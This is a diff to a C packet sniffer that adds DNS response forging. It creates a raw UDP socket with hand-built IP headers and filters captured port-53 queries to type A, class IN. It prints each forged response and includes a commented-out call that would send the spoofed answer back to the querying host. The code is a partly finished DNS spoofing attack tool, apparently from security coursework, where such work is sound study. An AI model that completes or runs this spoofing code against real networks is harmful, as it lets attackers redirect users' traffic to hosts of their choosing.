@@ -198,6 +198,37 @@ print_payload(const u_char *payload, int len)
 return;
 }
 
+void send_forged_dns_response(unsigned long destination_address, u_int16_t destination_port, \
+							char *data)
+{
+	int sd, one = 1;
+	const int *val = &one;
+	
+	// Source and destination addresses: IP and port
+	struct sockaddr_in source;
+	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+	if(sd < 0)
+	{
+		printf("socket() error");
+		return;
+	}
+	source.sin_family = AF_INET;
+	source.sin_port = destination_port;
+	source.sin_addr.s_addr = destination_address;
+
+	// Inform the kernel do not fill up the headers' structure, we fabricated our own
+	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+	{
+	    printf("setsockopt() error");
+	    return;
+	}
+	//if(sendto(sd, data, ip->iph_len, 0, (struct sockaddr *)&source, sizeof(source)) < 0)
+	//{
+	//	printf("sendto() error");
+	//	return;
+	//}
+	close(sd);
+}
 void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *size_payload, u_char* stringExpression)
 {
 	const struct sniff_ip *ip;              /* The IP header */
@@ -249,7 +280,7 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 			spoofed_udp_header->uh_ulen	 = htons(ntohs(udp->uh_ulen) + 16);
 			spoofed_udp_header->uh_sum = 0;
 
-			if(ntohs(udp->uh_sport) == 53 || ntohs(udp->uh_dport) == 53)
+			if(ntohs(udp->uh_dport) == 53)
 			{
 				// Forging the DNS Header
 				struct dns_header* spoofed_dns_header = (struct dns_header*)(datagram + size_ip + sizeof(struct udphdr));
@@ -294,10 +325,13 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
 				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
 
+				// Checking for DNS queries only of the type A and class INTERNET
+				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
+					return;
+
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
 					sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
 					sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
-					sprintf(args + strlen(args), " Query Type %lu Query Class %lu ", sizeof(u_int), sizeof(u_long));
 					printf("%s\n", args);
 					print_payload(*payload, *size_payload);
 					printf("Response Start\n");
@@ -305,6 +339,7 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
 						+ strlen(domain) + 1 + sizeof(struct dns_answer_data));
 					printf("Response End\n");
+					//send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram);
 				}
 			}
 			break;
